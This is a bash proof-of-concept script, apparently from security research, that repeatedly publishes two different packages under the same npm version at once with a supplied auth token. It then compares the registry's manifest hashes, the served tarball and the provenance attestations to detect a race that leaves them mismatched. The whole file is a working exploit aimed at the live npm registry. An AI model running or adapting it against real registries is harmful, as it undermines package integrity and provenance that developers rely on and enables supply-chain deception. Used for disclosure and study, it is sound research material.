#!/bin/bash
set -euo pipefail

TOKEN="$1"
MAX_ATTEMPTS="${2:-20}"

REPO_URL="https://github.com/darcyclarke/ghostpublish"
PKG="ghostpublish"

for ATTEMPT in $(seq 1 "$MAX_ATTEMPTS"); do
  VERSION="1.0.0-ci.wc.${ATTEMPT}.$(date +%s)"
  echo ""
  echo "=========================================="
  echo "Attempt $ATTEMPT/$MAX_ATTEMPTS — $VERSION"
  echo "=========================================="

  rm -rf /tmp/pkg-a /tmp/pkg-b
  mkdir -p /tmp/pkg-a /tmp/pkg-b

  echo "{\"name\": \"$PKG\", \"version\": \"${VERSION}\", \"description\": \"variant A\", \"repository\": {\"type\": \"git\", \"url\": \"$REPO_URL\"}}" > /tmp/pkg-a/package.json
  echo "// A: $(openssl rand -hex 16)" > /tmp/pkg-a/index.js
  echo "//registry.npmjs.org/:_authToken=${TOKEN}" > /tmp/pkg-a/.npmrc

  echo "{\"name\": \"$PKG\", \"version\": \"${VERSION}\", \"description\": \"variant B\", \"repository\": {\"type\": \"git\", \"url\": \"$REPO_URL\"}}" > /tmp/pkg-b/package.json
  echo "// B: $(openssl rand -hex 16)" > /tmp/pkg-b/index.js
  echo "//registry.npmjs.org/:_authToken=${TOKEN}" > /tmp/pkg-b/.npmrc

  A_INTEGRITY=$(cd /tmp/pkg-a && npm pack --json 2>/dev/null | jq -r '.[0].integrity')
  B_INTEGRITY=$(cd /tmp/pkg-b && npm pack --json 2>/dev/null | jq -r '.[0].integrity')
  rm -f /tmp/pkg-a/*.tgz /tmp/pkg-b/*.tgz

  set +e
  (cd /tmp/pkg-a && npm publish --access public --tag latest --provenance 2>&1 | tee /tmp/publish-a.log) &
  PID_A=$!
  (cd /tmp/pkg-b && npm publish --access public --tag latest --provenance 2>&1 | tee /tmp/publish-b.log) &
  PID_B=$!
  wait $PID_A; EXIT_A=$?
  wait $PID_B; EXIT_B=$?
  set -e

  echo "A exit: $EXIT_A | B exit: $EXIT_B"

  if [ $EXIT_A -eq 0 ] && [ $EXIT_B -eq 0 ]; then
    echo ""
    echo "*** BOTH SUCCEEDED — RACE TRIGGERED ***"
    echo ""

    sleep 10

    MANIFEST=$(curl -s "https://registry.npmjs.org/$PKG/${VERSION}")
    M_INTEGRITY=$(echo "$MANIFEST" | jq -r '.dist.integrity // "null"')
    M_SHASUM=$(echo "$MANIFEST" | jq -r '.dist.shasum // "null"')

    curl -sL "https://registry.npmjs.org/$PKG/-/$PKG-${VERSION}.tgz" -o /tmp/dl.tgz
    T_SHA1=$(sha1sum /tmp/dl.tgz | cut -d' ' -f1)
    T_INTEGRITY="sha512-$(sha512sum -b /tmp/dl.tgz | cut -d' ' -f1 | xxd -r -p | base64 -w 0)"

    echo "dist.integrity: $M_INTEGRITY"
    echo "dist.shasum:    $M_SHASUM"
    echo "tarball sha1:      $T_SHA1"
    echo "tarball integrity: $T_INTEGRITY"
    echo ""
    [ "$M_SHASUM" = "$T_SHA1" ] && echo "SHA-1: MATCH" || echo "SHA-1: MISMATCH"
    [ "$M_INTEGRITY" = "$T_INTEGRITY" ] && echo "SHA-512: MATCH" || echo "SHA-512: MISMATCH"

    mkdir -p /tmp/ex && rm -rf /tmp/ex/*
    tar xzf /tmp/dl.tgz -C /tmp/ex
    echo "CDN serves: $(cat /tmp/ex/package/index.js)"
    echo "CDN description: $(jq -r .description /tmp/ex/package/package.json)"
    echo ""
    echo "Manifest matches A: $([ "$M_INTEGRITY" = "$A_INTEGRITY" ] && echo 'YES' || echo 'NO')"
    echo "Manifest matches B: $([ "$M_INTEGRITY" = "$B_INTEGRITY" ] && echo 'YES' || echo 'NO')"

    echo ""
    sleep 5
    ATTESTATIONS=$(curl -s "https://registry.npmjs.org/-/npm/v1/attestations/$PKG@${VERSION}")
    echo "$ATTESTATIONS" | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
attestations = data.get('attestations', [])
if not attestations:
  print(f'No attestations: {data.get(\"error\", \"none\")}')
  sys.exit(0)
print(f'Attestations: {len(attestations)}')
hashes = set()
for i, a in enumerate(attestations):
  pred_type = a.get('predicateType', 'N/A').split('/')[-1]
  payload = a.get('bundle', {}).get('dsseEnvelope', {}).get('payload', '')
  if payload:
    pred = json.loads(base64.b64decode(payload))
    for s in pred.get('subject', []):
      for algo, digest in s.get('digest', {}).items():
        hashes.add(digest)
        print(f'  {i+1} [{pred_type}]: {algo}={digest[:40]}...')
print(f'Unique hashes: {len(hashes)}')
if len(hashes) > 1:
  print('*** MULTIPLE HASHES — DUAL-PROVENANCE FINGERPRINT ***')
"

    echo ""
    echo "=== WORST-CASE STATE ACHIEVED ==="
    echo "Version: $VERSION"
    echo "Attempt: $ATTEMPT"
    exit 0
  fi

  echo "Race did not trigger, retrying..."
  sleep 2
done

echo ""
echo "Race did not trigger in $MAX_ATTEMPTS attempts"
exit 1
